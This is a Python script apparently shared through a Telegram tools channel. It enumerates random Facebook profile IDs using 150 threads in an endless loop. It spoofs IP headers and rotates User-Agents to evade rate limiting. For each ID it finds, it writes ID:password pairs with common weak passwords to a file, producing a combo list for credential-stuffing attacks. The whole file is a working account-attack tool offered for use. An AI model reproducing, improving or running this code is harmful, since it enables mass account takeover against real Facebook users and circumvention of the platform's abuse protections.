import requests
import random
import threading
import time
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor
""" Coded By @anasxzer00 """
anasSaid = print

def ipv4_______anas():
    return '.'.join(str(random.randint(0, 255)) for _ in range(4))
def anas_req_id(anasxzer00):
    url = f"https://www.facebook.com/profile.php?id={anasxzer00}"
    userAgent_anas = UserAgent().random
    anas_ip = ipv4_______anas()
    headers = {
        "User-Agent": userAgent_anas,
        "X-Real-IP": anas_ip,
        "X-Forwarded-For": anas_ip,
        "X-Forwarded-For-IP": anas_ip
    }
    try:
        response = requests.get(url, headers=headers, timeout=3)
        if response.status_code == 200:
            if "content isn't available right now" in response.text:
                return False
            elif "About" in response.text or "Friends" in response.text or "Create new acc" in response.text:
                return True
        return False
    except requests.exceptions.RequestException:
        return False
def anas_gen_id():
    return f"1000{random.randint(10000000000, 99999999999)}"
def check_and_save():
    anasxzer00 = anas_gen_id()
    valid = anas_req_id(anasxzer00)
    if valid:
        anasSaid(f" >[â] {anasxzer00} | Good ID / Telegram: @MC_Tools")
        with open("ID.txt", "a") as file:
            file.write(f"{anasxzer00}:123456\n")
            file.write(f"{anasxzer00}:12345678\n")
            file.write(f"{anasxzer00}:11223344\n")
            file.write(f"{anasxzer00}:12341234\n")
    else:
        anasSaid(f" >[â] {anasxzer00} | Bad ID / Telegram: @MC_Tools")
def main():
    with ThreadPoolExecutor(max_workers=150) as executor:
        while True:
            executor.submit(check_and_save)
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
    	anasSaid(f"\n")
